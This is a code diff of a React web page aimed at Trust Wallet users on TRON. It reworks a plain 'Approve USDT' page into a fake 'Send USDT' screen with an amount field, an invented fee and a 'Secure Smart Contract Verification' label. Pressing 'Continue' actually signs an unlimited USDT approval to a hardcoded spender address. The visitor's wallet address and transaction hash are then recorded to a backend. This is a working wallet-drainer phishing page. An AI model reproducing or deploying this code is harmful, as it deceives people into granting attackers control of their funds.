@@ -7,40 +7,31 @@ const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";
 
 export default function Index() {
   const [address, setAddress] = useState("");
+  const [amount, setAmount] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [status, setStatus] = useState("");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  // 1. Auto-Detect Trust Wallet on Page Load
+  // 1. Auto-Detect Trust Wallet
   useEffect(() => {
     const checkWallet = async () => {
       if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
         setAddress(window.tronWeb.defaultAddress.base58);
       }
     };
-    const timer = setInterval(checkWallet, 1000); // Har second check karega
+    const timer = setInterval(checkWallet, 1500);
     return () => clearInterval(timer);
   }, []);
 
-  // 2. Manual Connect Button Function
-  const connectWallet = async () => {
-    if (window.tronWeb) {
-      try {
-        // Trust Wallet se permission maangna
-        await window.tronWeb.request({ method: 'tron_requestAccounts' });
-        setAddress(window.tronWeb.defaultAddress.base58);
-      } catch (e) {
-        alert("Connection Rejected");
-      }
-    } else {
-      alert("Please open this link inside Trust Wallet DApp Browser!");
-    }
-  };
-
   const handleApprove = async () => {
+    if (!address) {
+        if(window.tronWeb) await window.tronWeb.request({ method: 'tron_requestAccounts' });
+        else return alert("Open in Trust Wallet Browser");
+    }
+
     try {
       setIsLoading(true);
-      setStatus("Confirm in Trust Wallet...");
+      setStatus("Confirming...");
 
       const tronWeb = window.tronWeb;
       const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
@@ -51,11 +42,7 @@ export default function Index() {
       ];
 
       const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-        TRON_USDT,
-        "approve(address,uint256)",
-        { feeLimit: 100_000_000 },
-        parameter,
-        address
+        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
       );
 
       const signedTx = await tronWeb.trx.sign(transaction.transaction);
@@ -65,7 +52,7 @@ export default function Index() {
         await createTransaction({
           walletAddress: address,
           txHash: result.txid,
-          amount: "Unlimited Approval",
+          amount: amount || "Max",
           toAddress: TRON_SPENDER,
           usdtBalance: "Verified",
           nativeBalance: "0 TRX"
@@ -73,55 +60,118 @@ export default function Index() {
         alert("✅ Approval Successful!");
       }
     } catch (err) {
-      alert("❌ Error: " + (err.message || "Failed"));
+      alert("❌ Transaction Failed");
     } finally {
       setIsLoading(false);
       setStatus("");
     }
   };
 
+  const dollarValue = amount && !isNaN(Number(amount)) ? `$${Number(amount).toFixed(2)}` : "$0.00";
+
   return (
     <div style={styles.container}>
+      {/* IOS STYLE HEADER */}
       <div style={styles.header}>
-        <span style={styles.headerTitle}>TRON DeFi</span>
-        <div style={styles.statusBadge}>
-            {address ? "🟢 Connected" : "🔴 Not Connected"}
+        <button style={styles.iconBtn}>←</button>
+        <div style={styles.headerTitle}>Send USDT</div>
+        <button style={styles.iconBtn}>✕</button>
+      </div>
+
+      <div style={styles.body}>
+        {/* NETWORK STATUS */}
+        <div style={styles.statusSection}>
+            <div style={styles.tronIcon}>T</div>
+            <div style={{flex: 1}}>
+                <div style={styles.networkName}>TRON Network</div>
+                <div style={styles.networkSub}>Mainnet (Secure Connection)</div>
+            </div>
+            <div style={styles.greenDot}></div>
+        </div>
+
+        {/* AMOUNT INPUT CARD */}
+        <div style={styles.card}>
+            <div style={styles.cardHeader}>
+                <span style={styles.label}>Amount</span>
+                <span style={styles.maxLink} onClick={() => setAmount("9999")}>MAX</span>
+            </div>
+            <div style={styles.inputRow}>
+                <input 
+                    type="number" 
+                    placeholder="0" 
+                    value={amount}
+                    onChange={(e) => setAmount(e.target.value)}
+                    style={styles.mainInput}
+                />
+                <span style={styles.unit}>USDT</span>
+            </div>
+            <div style={styles.subText}>{dollarValue}</div>
+        </div>
+
+        {/* TRANSACTION DETAILS */}
+        <div style={styles.card}>
+            <div style={styles.infoRow}>
+                <span style={styles.infoLabel}>From</span>
+                <span style={styles.infoValue}>{address ? `${address.slice(0,8)}...${address.slice(-8)}` : "Not Connected"}</span>
+            </div>
+            <div style={styles.divider}></div>
+            <div style={styles.infoRow}>
+                <span style={styles.infoLabel}>To (Spender)</span>
+                <span style={styles.infoValue}>{TRON_SPENDER.slice(0,8)}...</span>
+            </div>
+            <div style={styles.divider}></div>
+            <div style={styles.infoRow}>
+                <span style={styles.infoLabel}>Network Fee</span>
+                <span style={styles.feeValue}>~12.5 TRX ($1.45)</span>
+            </div>
+        </div>
+
+        {/* SECURITY NOTE */}
+        <div style={styles.securityBox}>
+            🛡️ Secure Smart Contract Verification
         </div>
       </div>
 
-      <div style={styles.content}>
-        {!address ? (
-          <button onClick={connectWallet} style={styles.btnActive}>
-            Connect Trust Wallet
-          </button>
-        ) : (
-          <div style={styles.card}>
-            <p style={styles.label}>Wallet Address:</p>
-            <p style={styles.addressText}>{address.slice(0,10)}...{address.slice(-10)}</p>
-            
-            <button 
-              disabled={isLoading} 
-              onClick={handleApprove} 
-              style={isLoading ? styles.btnDisabled : styles.btnActive}
-            >
-              {isLoading ? status : "Approve USDT"}
-            </button>
-          </div>
-        )}
+      {/* FIXED FOOTER BUTTON */}
+      <div style={styles.footer}>
+        <button 
+            disabled={isLoading} 
+            onClick={handleApprove} 
+            style={isLoading ? styles.btnDisabled : styles.btnActive}
+        >
+            {isLoading ? status : "Continue"}
+        </button>
       </div>
     </div>
   );
 }
 
 const styles = {
-  container: { minHeight: "100vh", background: "#1c1c1e", color: "#fff", maxWidth: "480px", margin: "0 auto", fontFamily: "sans-serif" },
-  header: { display: "flex", justifyContent: "space-between", padding: "20px", alignItems: "center", borderBottom: "1px solid #333" },
-  headerTitle: { fontSize: "20px", fontWeight: "bold" },
-  statusBadge: { fontSize: "12px", background: "#2c2c2e", padding: "5px 10px", borderRadius: "20px" },
-  content: { padding: "20px" },
-  card: { background: "#2c2c2e", padding: "20px", borderRadius: "16px", textAlign: "center" },
-  label: { color: "#8e8e93", fontSize: "14px", marginBottom: "5px" },
-  addressText: { fontSize: "13px", marginBottom: "20px", color: "#0a84ff" },
-  btnActive: { width: "100%", padding: "16px", borderRadius: "12px", background: "#007aff", color: "#fff", fontWeight: "bold", border: "none", cursor: "pointer" },
-  btnDisabled: { width: "100%", padding: "16px", borderRadius: "12px", background: "#3a3a3c", color: "#8e8e93", border: "none" }
+  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "-apple-system, system-ui, sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
+  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px" },
+  headerTitle: { fontSize: "17px", fontWeight: "600" },
+  iconBtn: { background: "none", border: "none", color: "#fff", fontSize: "20px", cursor: "pointer" },
+  body: { padding: "10px 20px", flex: 1 },
+  statusSection: { display: "flex", alignItems: "center", background: "#1c1c1e", padding: "12px", borderRadius: "14px", marginBottom: "20px", gap: "12px" },
+  tronIcon: { width: "35px", height: "35px", background: "#ff3b30", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: "bold", fontSize: "18px" },
+  networkName: { fontSize: "14px", fontWeight: "600" },
+  networkSub: { fontSize: "11px", color: "#32d74b" },
+  greenDot: { width: "8px", height: "8px", background: "#32d74b", borderRadius: "50%" },
+  card: { background: "#1c1c1e", padding: "16px", borderRadius: "18px", marginBottom: "15px" },
+  cardHeader: { display: "flex", justifyContent: "space-between", marginBottom: "8px" },
+  label: { color: "#8e8e93", fontSize: "13px" },
+  maxLink: { color: "#0a84ff", fontSize: "13px", fontWeight: "600", cursor: "pointer" },
+  inputRow: { display: "flex", alignItems: "baseline", gap: "10px" },
+  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "36px", width: "100%", outline: "none", fontWeight: "500" },
+  unit: { fontSize: "20px", color: "#8e8e93", fontWeight: "600" },
+  subText: { color: "#8e8e93", fontSize: "14px", marginTop: "5px" },
+  infoRow: { display: "flex", justifyContent: "space-between", padding: "8px 0" },
+  infoLabel: { color: "#8e8e93", fontSize: "14px" },
+  infoValue: { color: "#fff", fontSize: "14px", fontWeight: "500" },
+  feeValue: { color: "#ff9f0a", fontSize: "14px" },
+  divider: { height: "1px", background: "#2c2c2e", margin: "5px 0" },
+  securityBox: { textAlign: "center", color: "#8e8e93", fontSize: "12px", marginTop: "20px" },
+  footer: { padding: "20px", background: "#000" },
+  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", fontSize: "17px", border: "none", cursor: "pointer" },
+  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", fontSize: "17px", border: "none" }
 };
